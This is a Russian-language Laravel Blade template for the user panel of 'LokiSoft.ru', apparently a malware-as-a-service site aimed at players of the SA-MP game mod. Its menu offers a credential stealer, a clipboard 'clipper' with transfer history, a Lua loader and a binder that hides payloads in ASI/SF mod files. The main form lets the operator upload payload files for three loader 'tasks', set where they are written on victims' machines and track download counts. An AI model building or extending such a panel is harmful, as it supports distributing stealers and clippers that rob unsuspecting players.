<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="utf-8" />
    <title>LokiSoft.ru - Скрипты SAMP</title>
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <link rel="shortcut icon" href="assets/images/favicon.ico">
    <!--Morris Chart CSS -->
    <link rel="stylesheet" href="assets/plugins/morris/morris.css">
    <!-- Bootstrap core CSS -->
    <link href="assets/css/bootstrap.min.css" rel="stylesheet">
    <!-- MetisMenu CSS -->
    <link href="assets/css/metisMenu.min.css" rel="stylesheet">
    <!-- Icons CSS -->
    <link href="assets/css/icons.css" rel="stylesheet">
    <!-- Custom styles for this template -->
    <link href="assets/css/style.css" rel="stylesheet">
</head>
<body >
<div id="page-wrapper">
    <!-- Top Bar Start -->
    <div class="topbar">
        <!-- LOGO -->
        <div class="topbar-left">
            <div class="">
                <a href="/main" class="logo">
                    <img src="assets/images/logo.png" width="270"  alt="logo" class="logo-lg " />  
                    <img src="assets/images/logo_sm.png" alt="logo" class="logo-sm hidden" />
                </a>
            </div>
        </div>
        <!-- Top navbar -->
        <div class="navbar navbar-default" role="navigation">
            <div class="container">
                <div class="">
                    <!-- Mobile menu button -->
                    <div class="pull-left">

                        <span class="clearfix"></span>
                    </div>
                    <!-- Top nav left menu -->
                    <ul class="nav navbar-nav hidden-sm hidden-xs top-navbar-items">
                        <li><a href="/dowloadloader">Скачать loader</a></li>
                    </ul>
                    <!-- Top nav Right menu -->
                    <ul class="nav navbar-nav navbar-right top-navbar-items-right pull-right">
                        <li class="dropdown top-menu-item-xs">
                            <a href="#" data-target="#" class="dropdown-toggle menu-right-item" data-toggle="dropdown" aria-expanded="true">
                                <i class="mdi mdi-bell"></i> <span class="label label-danger">{{ $news->count() }}</span>
                            </a>
                            <ul class="dropdown-menu p-0 dropdown-menu-lg">
                                <!--<li class="notifi-title"><span class="label label-default pull-right">New 3</span>Notification</li>-->
                                <li class="list-group notification-list" style="height: 267px;">
                                    <div class="slimscroll">
                                        <!-- list item-->
                                        @foreach($news as $new)
                                            <a href="javascript:void(0);" class="list-group-item">
                                                <div class="media">
                                                    <div class="media-left p-r-10">
                                                        <em class="fa fa-cog bg-warning"></em>
                                                    </div>
                                                    <div class="media-body">
                                                        <h5 class="media-heading">{{ $new->news }}</h5>
                                                        <p class="m-0">
                                                            <small>{{ $new->description }}</small>
                                                        </p>
                                                    </div>
                                                </div>
                                            </a>
                                        @endforeach
                                    </div>
                                </li>
                            </ul>
                        </li>
                        <li class="dropdown top-menu-item-xs">
                            <a href="" class="dropdown-toggle menu-right-item profile" data-toggle="dropdown" aria-expanded="true"><img src="@if($info_user->image == null) https://diskomir.ru/upload/iblock/daf/daff9848cd628b79d6b268cb827c254d.jpg @else {{$info_user->image }} @endif" alt="user-img" class="img-circle"> </a>
                            <ul class="dropdown-menu">
                                <li><a href="/profile"><i class="ti-user m-r-10"></i>Профиль</a></li>
                                <li><a href="javascript:void(0)"><i class="ti-settings m-r-10"></i>Настройки</a></li>
                                <li><a href="/payment" target="_blank"><i class=" mdi mdi-currency-usd"></i> Баланс: {{ $info_user->balance }}р.</a></li>
                                <li class="divider"></li>
                                <li><a href="/logout"><i class="ti-power-off m-r-10"></i> Выйти</a></li>
                            </ul>
                        </li>
                    </ul>
                </div>
            </div> <!-- end container -->
        </div> <!-- end navbar -->
    </div>
    <!-- Top Bar End -->


    <!-- Page content start -->
    <div class="page-contentbar">

        <!--left navigation start-->
        <aside class="sidebar-navigation">
            <div class="scrollbar-wrapper">
                <div>
                    <button type="button" class="button-menu-mobile btn-mobile-view visible-xs visible-sm">
                        <i class="mdi mdi-close"></i>
                    </button>
                    <!-- User Detail box -->
                    <div class="user-details">
                        <div class="pull-left">
                            <img src="@if($info_user->image == null) https://diskomir.ru/upload/iblock/daf/daff9848cd628b79d6b268cb827c254d.jpg @else {{$info_user->image }} @endif" alt="" class="thumb-md img-circle">
                        </div>
                        <div class="user-info">
                            <a href="#">{{ $info_user->name }}</a>
 <p class="text-muted m-0">Баланс: {{ $info_user->balance }} р.<a href="/payment">(Пополнить)</a></p>                        </div>
                    </div>
                    <!--- End User Detail box -->

                    <!-- Left Menu Start -->
                    <ul class="metisMenu nav" id="side-menu">
                        <li><a href="/main"><i class="ti-home"></i>Главная</a></li>
                        <li><a href="/stealer"> <i class="ti-paint-bucket"></i>Stealer SA:MP</a></li>
                        <li><a href="javascript: void(0);" aria-expanded="true"><i class="ti-spray"></i>Clipper SA:MP<span class="fa arrow"></a>
                            <ul class="nav-second-level nav" aria-expanded="true">
                                <li><a href="/clipper">История переводов</a></li>
                                <li><a href="/settings">Настройка</a></li>
                            </ul>
                        </li>
                        <li><a href="/freeloader"><i class="mdi mdi-arrow-down-bold-hexagon-outline"></i>Loader[LUA FREE]</a></li>
                        <li><a href="/gluer"><i class="ti-share"></i>Склейщик - ASI | SF</a></li>
                        <li><a href="/piar"><i class="mdi mdi-cash"></i>Пиар файлов</a></li>
                    </ul>
                </div>
            </div><!--Scrollbar wrapper-->
        </aside>
        <div id="page-right-content">

            <div class="container">
                <div class="row">
                    <div class="col-sm-12">

                        <div class="col-sm-4">
                            <div class="card-box">

                                <h6 class="text-muted m-t-0 text-uppercase">Всего загрузок</h6>
                                <h2 class="m-b-20"><span>{{ $count_loader }}</span></h2>
                                <div class="progress progress-sm m-0">
                                    <div class="progress-bar progress-bar-warning" role="progressbar" aria-valuenow="77" aria-valuemin="0" aria-valuemax="100" style="width: 100%;">

                                    </div>
                                </div>
                            </div>
                        </div>

                    </div>
                </div>

                <div class="container">
                    <div class="row">
                        <div class="col-sm-12">
                            <h4 class="header-title m-t-0 m-b-20">Управление файлами</h4>
                        </div>

                    </div> <!-- end row -->
                    <div class="row">
                        <div class="col-sm-12">
                            <div class="card-box widget-inline">
                                <div class="row">
                                    <form class="" action="/downloadtask" method="POST" enctype="multipart/form-data">
                                        @csrf
                                    <div class="col-lg-3 col-sm-6">
                                        <div class="widget-inline-box text-center">

                                            <h3><i class="text-primary"></i> <b data-plugin="counterup">Task 1</b></h3>
                                            <button type="submit" class="btn btn-primary waves-effect waves-light">
                                                Сохранить
                                            </button>
                                        </div>
                                    </div>
                                    <div class="col-lg-3 col-sm-6">
                                        <div class="widget-inline-box text-center">
                                            <h3><i class="text-custom "></i> <b data-plugin="counterup">{{ $info_loader->download_1 }}</b></h3>
                                            <p class="text-muted">Загрузок</p>
                                        </div>
                                    </div>
                                    <div class="col-lg-3 col-sm-6">
                                        <div class="widget-inline-box text-center">
                                            <h3><i class="text-info"></i> <b data-plugin="counterup">Файл</b></h3>
                                            <input type="file" name="task_1" class="filestyle" data-buttonname="btn-default">
                                        </div>
                                    </div>
                                    <div class="col-lg-3 col-sm-6">
                                        <div class="widget-inline-box text-center b-0">
                                            <h3><i class="text-danger"></i> <b data-plugin="counterup">Путь</b></h3>
                                            <input type="text" class="form-control"
                                                 name="directory_1"  id="webSite" placeholder="Укажите путь загрузки файла" value="{{ $info_loader->directory_1 }}">
                                        </div>
                                    </div>
                                    </form>
                            </div>
                            </div>
                        </div>
                        <div class="col-sm-12">
                            <div class="card-box widget-inline">
                                <div class="row">
                                    <form class="" action="/downloadtask" method="POST" enctype="multipart/form-data">
                                        @csrf
                                    <div class="col-lg-3 col-sm-6">
                                        <div class="widget-inline-box text-center">
                                            <h3><i class="text-primary"></i> <b data-plugin="counterup">Task 2</b></h3>
                                            <button type="submit" class="btn btn-primary waves-effect waves-light">
                                                Сохранить
                                            </button>
                                        </div>
                                    </div>
                                    <div class="col-lg-3 col-sm-6">
                                        <div class="widget-inline-box text-center">
                                            <h3><i class="text-custom "></i> <b data-plugin="counterup">{{ $info_loader->download_2 }}</b></h3>
                                            <p class="text-muted">Загрузок</p>
                                        </div>
                                    </div>
                                    <div class="col-lg-3 col-sm-6">
                                        <div class="widget-inline-box text-center">
                                            <h3><i class="text-info"></i> <b data-plugin="counterup">Файл</b></h3>
                                            <input type="file"name="task_2" class="filestyle" data-buttonname="btn-default">
                                        </div>
                                    </div>
                                    <div class="col-lg-3 col-sm-6">
                                        <div class="widget-inline-box text-center b-0">
                                            <h3><i class="text-danger"></i> <b data-plugin="counterup">Путь</b></h3>
                                            <input type="text" class="form-control"
                                                   name="directory_2"     id="webSite" placeholder="Укажите путь загрузки файла"value="{{ $info_loader->directory_2 }}">
                                        </div>
                                    </div>
                                    </form>
                                </div>
                            </div>
                        </div>
                        <div class="col-sm-12">
                            <div class="card-box widget-inline">
                                <div class="row">
                                    <form class="" action="/downloadtask" method="POST" enctype="multipart/form-data">
                                        @csrf
                                    <div class="col-lg-3 col-sm-6">
                                        <div class="widget-inline-box text-center">
                                            <h3><i class="text-primary"></i> <b data-plugin="counterup">Task 3</b></h3>
                                            <button type="submit" class="btn btn-primary waves-effect waves-light">
                                                Сохранить
                                            </button>
                                        </div>
                                    </div>
                                    <div class="col-lg-3 col-sm-6">
                                        <div class="widget-inline-box text-center">
                                            <h3><i class="text-custom "></i> <b data-plugin="counterup">{{ $info_loader->download_3 }}</b></h3>
                                            <p class="text-muted">Загрузок</p>
                                        </div>
                                    </div>
                                    <div class="col-lg-3 col-sm-6">
                                        <div class="widget-inline-box text-center">
                                            <h3><i class="text-info"></i> <b data-plugin="counterup">Файл</b></h3>
                                            <input type="file"name="task_3" class="filestyle" data-buttonname="btn-default">
                                        </div>
                                    </div>
                                    <div class="col-lg-3 col-sm-6">
                                        <div class="widget-inline-box text-center b-0">
                                            <h3><i class="text-danger"></i> <b data-plugin="counterup">Путь</b></h3>
                                            <input type="text" class="form-control"
                                                   name="directory_3"    id="webSite" placeholder="Укажите путь загрузки файла" value="{{ $info_loader->directory_3 }}">
                                        </div>
                                    </div>
                                    </form>
                                </div>
                            </div>
                        </div>




                    </div> <!-- end col -->
                </div>
                <!-- end row -->
                <div class="footer">
                    <div>
                        <strong>LokiSoft.ru </strong> - Copyright &copy; 2020
                    </div>
                </div> <!-- end footer -->

            </div>
            <!-- End #page-right-content -->
        </div>
        <!-- end .page-contentbar -->
    </div>
    <!-- End #page-wrapper -->
    <!-- js placed at the end of the document so the pages load faster -->
    <script src="assets/js/jquery-2.1.4.min.js"></script>
    <script src="assets/js/bootstrap.min.js"></script>
    <script src="assets/js/metisMenu.min.js"></script>
    <script src="assets/js/jquery.slimscroll.min.js"></script>
    <!-- Datatable js -->
    <script src="assets/plugins/datatables/jquery.dataTables.min.js"></script>
    <script src="assets/plugins/datatables/dataTables.bootstrap.js"></script>
    <script src="assets/plugins/datatables/dataTables.buttons.min.js"></script>
    <script src="assets/plugins/datatables/buttons.bootstrap.min.js"></script>
    <script src="assets/plugins/datatables/jszip.min.js"></script>
    <script src="assets/plugins/datatables/pdfmake.min.js"></script>
    <script src="assets/plugins/datatables/vfs_fonts.js"></script>
    <script src="assets/plugins/datatables/buttons.html5.min.js"></script>
    <script src="assets/plugins/datatables/buttons.print.min.js"></script>
    <script src="assets/plugins/datatables/dataTables.keyTable.min.js"></script>
    <script src="assets/plugins/datatables/dataTables.responsive.min.js"></script>
    <script src="assets/plugins/datatables/responsive.bootstrap.min.js"></script>
    <script src="assets/plugins/datatables/dataTables.scroller.min.js"></script>
    <script src="assets/plugins/datatables/dataTables.colVis.js"></script>
    <script src="assets/plugins/datatables/dataTables.fixedColumns.min.js"></script>
    <!-- init -->
    <script src="assets/pages/jquery.datatables.init.js"></script>
    <!-- App Js -->
    <script src="assets/js/jquery.app.js"></script>

    <script src="assets/plugins/bootstrap-tagsinput/js/bootstrap-tagsinput.min.js"></script>
    <script src="assets/plugins/select2/js/select2.min.js" type="text/javascript"></script>
    <script src="assets/plugins/bootstrap-filestyle/js/bootstrap-filestyle.min.js" type="text/javascript"></script>
    <script src="assets/plugins/switchery/switchery.min.js"></script>
    <script type="text/javascript" src="assets/plugins/parsleyjs/parsley.min.js"></script>

    <script src="assets/plugins/moment/moment.js"></script>
    <script src="assets/plugins/timepicker/bootstrap-timepicker.js"></script>
    <script src="assets/plugins/bootstrap-colorpicker/js/bootstrap-colorpicker.min.js"></script>
    <script src="assets/plugins/bootstrap-datepicker/js/bootstrap-datepicker.min.js"></script>
    <script src="assets/plugins/clockpicker/js/bootstrap-clockpicker.min.js"></script>
    <script src="assets/plugins/bootstrap-daterangepicker/daterangepicker.js"></script>
    <script src="assets/plugins/summernote/summernote.min.js"></script>

    <!-- form advanced init js -->
    <script src="assets/pages/jquery.form-advanced.init.js"></script>

    <!-- App Js -->
    <script src="assets/js/jquery.app.js"></script>

    <script type="text/javascript">
        $(document).ready(function() {
            $('.form-validation').parsley();
            $('.summernote').summernote({
                height: 350,                 // set editor height
                minHeight: null,             // set minimum height of editor
                maxHeight: null,             // set maximum height of editor
                focus: false                 // set focus to editable area after initializing summernote
            });
        });
    </script>
</body>
</html>
